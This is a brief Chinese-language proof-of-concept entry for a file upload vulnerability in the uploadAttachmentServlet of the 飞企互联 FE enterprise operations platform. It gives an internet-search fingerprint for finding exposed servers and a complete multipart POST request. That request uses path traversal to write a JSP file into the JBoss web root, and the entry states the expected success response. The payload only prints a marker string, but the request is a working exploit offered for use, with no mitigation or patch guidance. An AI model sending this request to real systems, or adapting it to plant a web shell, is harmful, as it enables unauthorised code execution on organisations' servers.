# 飞企互联FE企业运营管理平台uploadAttachmentServlet文件上传漏洞

- **系统**：飞企互联FE企业运营管理平台uploadAttachmentServlet　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/login/indexPicXml_valid.jsp?p="`
- **请求**：`POST /servlet/uploadAttachmentServlet HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei`

**请求体 / payload**
```
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/dudesuite.jsp"
Content-Type: text/plain
<% out.println("dudesuite");%>
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="json"
{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundarygcflwtei--
```
- **预期**：200　|　上传成功